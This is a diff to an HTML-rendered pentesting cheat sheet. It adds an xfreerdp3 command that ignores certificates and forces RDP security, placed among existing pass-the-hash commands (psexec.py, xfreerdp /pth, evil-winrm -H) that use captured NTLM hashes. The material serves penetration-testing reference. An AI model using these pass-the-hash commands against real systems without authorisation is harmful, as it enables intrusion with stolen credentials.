@@ -1470,6 +1470,9 @@ psexec.py<span class="w"> </span>-hashes<span class="w"> </span>&lt;NTLM<span cl
 
 <span class="c1"># Using xfreerdp</span>
 xfreerdp<span class="w"> </span>/v:&lt;target&gt;<span class="w"> </span>/u:&lt;domain&gt;<span class="se">\\</span>&lt;user&gt;<span class="w"> </span>/pth:&lt;NTLM<span class="w"> </span>hash&gt;
+<span class="c1">## Ignore certificates and force sec protocol to RDP</span>
+xfreerdp3<span class="w"> </span>/v:&lt;target&gt;<span class="w"> </span>/cert:ignore<span class="w"> </span>/sec:rdp<span class="w"> </span>/size:1180x708
+
 
 <span class="c1"># Using evil-winrm</span>
 evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;NTLM<span class="w"> </span>hash&gt;
